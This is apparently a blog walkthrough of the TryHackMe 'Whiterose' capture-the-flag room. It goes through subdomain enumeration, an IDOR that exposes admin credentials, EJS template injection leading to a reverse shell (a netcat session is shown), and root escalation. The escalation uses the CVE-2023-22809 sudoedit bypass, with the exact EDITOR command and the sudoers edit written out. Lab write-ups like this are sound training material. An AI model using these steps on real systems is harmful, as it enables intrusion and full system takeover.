---
title: Whiterose - tryhackme, ngn
date: 2025-02-28 11:27:10 -5000
categories: [THM,Easy,Linux]
tags: [RCE,Web,SSTI,]
---

Yet another Mr. Robot themed challenge.
![whiterose.png](Assets/Pictures/whiterose/whiterose.png){: w="600" h="600" }

Today, I’m going to solve The [Whiterose](https://tryhackme.com/room/whiterose) challenge.

## Description
This challenge is based on the Mr. Robot episode `409 Conflict`. Contains spoilers!
Go ahead and start the machine, it may take a few minutes to fully start up.
And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`.

---

## Nmap
To begin our enumeration, we'll perform an `nmap` scan to identify **open ports**, running **services**.
````console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````
### Analysis
From the scan, returned **two open** ports:
1. Port 22 (SSH): Running **OpenSSH** `7.6p1` on Ubuntu.
2. Port 80 (HTTP): Hosting a web service using **nginx** `1.14.0` (Ubuntu).

---
After visiting the `cyprusbank.thm`, also running directory enumeration, no useful results were found.
![cyprusbank.thm.png](Assets/Pictures/whiterose/cyprusbank.thm.png)
> There's nothing interesting on `cyprusbank.thm`, but there could be **subdomains** configured.
{: .prompt-info }

---

## ffuf
To uncover them, we will perform **host** enumeration using `ffuf`.
````console
ffuf -w '/usr/share/seclists/Discovery/Web-Content/big.txt' \
     -u 'http://cyprusbank.thm/' -H 'Host: FUZZ.cyprusbank.thm' -fw 1

admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 201ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 190ms]
:: Progress: [20478/20478] :: Job [1/1] :: 142 req/sec :: Duration: [0:01:44] :: Errors: 0 ::
````

---

### Analysis

Our `ffuf` scan successfully identified **two** virtual hosts on `cyprusbank.thm`.
   1. **www:** `www.cyprusbank.thm`
   ![www.cyprusbank.thm.png](Assets/Pictures/whiterose/www.cyprusbank.thm.png)
   After accessing `www.cyprusbank.thm`, it appears to be identical to the main site.

   2. **admin:** `admin.cyprusbank.thm`
   ![admin.cyprusbank.thm.png](Assets/Pictures/whiterose/admin.cyprusbank.thm.png)
   But accessing `admin.cyprusbank.thm` reveals a **login page**.

---    

## Web Access Olivia Cortez
We have **Olivia Cortez's** credentials from the room.
![logged-in-as-Olivia.png](Assets/Pictures/whiterose/logged-in-as-Olivia.png)
I was able to **log in** as her.

---

### Analysis
While exploring the web interface, the **Messages** menu caught my attention.
![messages-admin-pannel.png](Assets/Pictures/whiterose/messages-admin-pannel.png)
We can see the **Messages History**, which is set to `?c=5` in the URL.
````plaintext
http://admin.cyprusbank.thm/messages/?c=5
````
This parameter is vulnerable to **IDOR**.
![usergayle.png](Assets/Pictures/whiterose/usergayle.png)
By setting the parameter value to `0`, we discover the credentials of an admin user, **Gayle Bev**.

---

## Web Access Gayle Bev
Now that we have **Gayle Bev** credentials, let's log in & explore further.
![logged-in-as-Gayle.png](Assets/Pictures/whiterose/logged-in-as-Gayle.png)
logged in as **Gayle Bev**.

---

### Analysis
We have access to **user** account details.
![Tyrell-number.png](Assets/Pictures/whiterose/Tyrell-number.png)
Now, let's proceed with **answering** the provided **questions**.

---

#### flags
`1.` What's **Tyrell Wellick's** phone number?
- 842-029-5701

> Take things a step further and **compromise** the **machine**.
{: .prompt-info }

---

## Exploitation
Now, we need to identify an attack vector to get into **system**.
![customers-settings.png](Assets/Pictures/whiterose/customers-settings.png)
As **Gayle Bev**, we have access to the `Settings` endpoint, where customer `passwords` can be modified.
> Notably, the `passwords` are **reflected**, making this a potential target for **XSS** or **SSTI**.
{: .prompt-tip }

If we intercept a **request** and omit parameters like the `password`, an error message appears, 
![burpsuite-ejs.png](Assets/Pictures/whiterose/burpsuite-ejs.png)
revealing that `EJS` files are included. This strongly suggests a potential **SSTI**.

To verify if the site is truly vulnerable to **SSTI**, i injected [ejs-ssti-payload](https://eslam.io/posts/ejs-server-side-template-injection-rce/).
![ejs-ssti-payload.png](Assets/Pictures/whiterose/ejs-ssti-payload.png)
& attempted to establish a connection to **Python server**. 
````console
python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
10.10.XX.63 - - [27/Feb/2025 16:34:08] "GET / HTTP/1.1" 200 -
10.10.XX.63 - - [27/Feb/2025 16:34:08] "GET / HTTP/1.1" 200 -
10.10.XX.63 - - [27/Feb/2025 16:34:09] "GET / HTTP/1.1" 200 -
````
This test helps confirm `arbitrary code execution` is possible.

---

### shell as www
Since **SSTI** can lead to **RCE**, I'll use [RevShells](https://www.revshells.com/) to generate a reverse shell payload.
![reverse-shell.png](Assets/Pictures/whiterose/reverse-shell.png)
After crafting the **EJS-SSTI payload**, 
![reverse-shell-ssti-payload.png](Assets/Pictures/whiterose/reverse-shell-ssti-payload.png)
I executed it with a **reverse shell payload**, Successfully establishing a **Netcat connection** back to my computer.
````shell
nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.17.XX.XXX] from (UNKNOWN) [10.10.XX.XX] 33714
whoami
web
python3 --version
Python 3.6.9
python3 -c 'import pty;pty.spawn("/bin/bash")'
web@cyprusbank:~/app$ 
````
With a `shell` established as the **web** user, we can now proceed to answer next question.

---
#### flags
`2.` What is the `user.txt` flag?
````shell
web@cyprusbank:~$ ls -la
total 52
drwxr-xr-x 9 web  web  4096 Apr  4  2024 .
drwxr-xr-x 3 root root 4096 Jul 16  2023 ..
drwxr-xr-x 7 web  web  4096 Jul 17  2023 app
-rw-r--r-- 1 web  web   807 Jul 15  2023 .profile
-rw-r--r-- 1 root root   35 Jul 15  2023 user.txt
web@cyprusbank:~$ cat user.txt
````

---

### shell as root
Now, it's time to **escalate privileges** and obtain a **root** `shell`.
Running `sudo -l` reveals that,
````shell
web@cyprusbank:~$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
````    
The **web** user can run `sudoedit` as **root**
> **without** a `password` for: `/etc/nginx/sites-available/admin.cyprusbank.thm`
{: .prompt-info }

We found a **sudoedit** bypass (**[CVE-2023-22809](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)**) in **sudo ≤ 1.9.12p1**, allowing file `read/edit` via `EDITOR`.
````shell
web@cyprusbank:~$ sudoedit --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
````
> Since the system is running **sudo** version `1.9.12p1`, it is **vulnerable**.
{: .prompt-info }

To escalate privileges to **root**, we exploit the **sudoedit** bypass to modify `/etc/sudoers`.
````shell
web@cyprusbank:~$ export EDITOR="vi -- /etc/sudoers"
````
**Explanation:**
- `export`: Sets an **environment variable** for the current session.
- `EDITOR`: Specifies the **text editor** to be used by commands like `sudoedit`.
- `vi -- /etc/sudoers`:
     - `vi`: Sets `vi` as the **editor**.
     - `-- /etc/sudoers`: Appends the **file path**, tricking `sudoedit` into opening `/etc/sudoers`.

Now, we modify the `sudoers` file to **escalate privileges**.

```shell
## sudoers file.
root ALL=(ALL:ALL) ALL

## Uncomment to allow members of group wheel to execute any command
# %wheel ALL=(ALL:ALL) ALL

## Same thing without a password
# %wheel ALL=(ALL:ALL) NOPASSWD: ALL

## Uncomment to allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
web ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
## Uncomment to allow any user to run sudo if they know the password
## of the user they are running the command as (root by default).
# Defaults targetpw  # Ask for the password of the target user
# ALL ALL=(ALL:ALL) ALL  # WARNING: only use this together with 'Defaults targetpw'

## Read drop-in files from /etc/sudoers.d
@includedir /etc/sudoers.d
```
**Locate** the existing rule:
```markdown
web ALL=(root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
**Replace** it with:
```markdown
web ALL=(root) NOPASSWD: ALL
```
With a simple `sudo su`, we successfully **escalated** to the **root** user without needing a **password**.
```shell
web@cyprusbank:~$ sudo su
root@cyprusbank:/home/web# whoami
root
root@cyprusbank:/home/web# id
uid=0(root) gid=0(root) groups=0(root)
root@cyprusbank:/home/web#
```
We can now proceed to **answer** last **question**.

---

#### flags
`3.` What is the `root.txt` flag?
```shell
root@cyprusbank:/home/web# cd /root/
root@cyprusbank:~# ls -la
total 40
drwx------  6 root root 4096 Apr  4  2024 .
drwxr-xr-x 23 root root 4096 Jul 12  2023 ..
drwxr-xr-x  3 root root 4096 Jul 16  2023 .local
drwxr-xr-x  5 root root 4096 Apr  4  2024 .pm2
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   21 Jul 15  2023 root.txt
root@cyprusbank:~# cat root.txt
```
**Answering** the **final** **question**,
![challenge-whiterose-solved.png](Assets/Pictures/whiterose/challenge-whiterose-solved.png)
I have **successfully** completed the [Whiterose](https://tryhackme.com/room/whiterose) **challenge!**

## Happy hacking !
In this **challenge**, I discovered **admin panel** through **subdomain** enumeration & exploited an **IDOR** vulnerability to access `sensitive data`, leading to **admin credentials**. Using **SSTI**, I gained **RCE** and established a `shell`.

<div style="display: flex; justify-content: center; align-items: center; height: 60vh; background-color:rgba(175, 174, 174, 0);">
    <div class="tenor-gif-embed" data-postid="15717036" data-share-method="host" data-aspect-ratio="1" data-width="70%">
        <a href="https://tenor.com/view/mr-robot-smoke-cigarette-gif-15717036" style="color: #fff; text-decoration: none; font-size: 16px;">Mr Robot Smoke GIF</a> 
        from <a href="https://tenor.com/search/mr+robot-gifs" style="color: #ffcc00; text-decoration: none; font-size: 16px;">Mr Robot GIFs</a>
    </div>
</div>
<script type="text/javascript" async src="https://tenor.com/embed.js"></script>

{% capture centered_text %}
Leveraging **misconfigured sudo permissions** and 
**[CVE-2023-22809](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)**, 
I escalated privileges to `root`.
{% endcapture %}

<div class="text-center">
  {{ centered_text | markdownify }}
</div>

Here are some resources:
* [https://eslam.io/posts/ejs-server-side-template-injection-rce/](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
* [https://www.revshells.com/](https://www.revshells.com/)
* [https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)

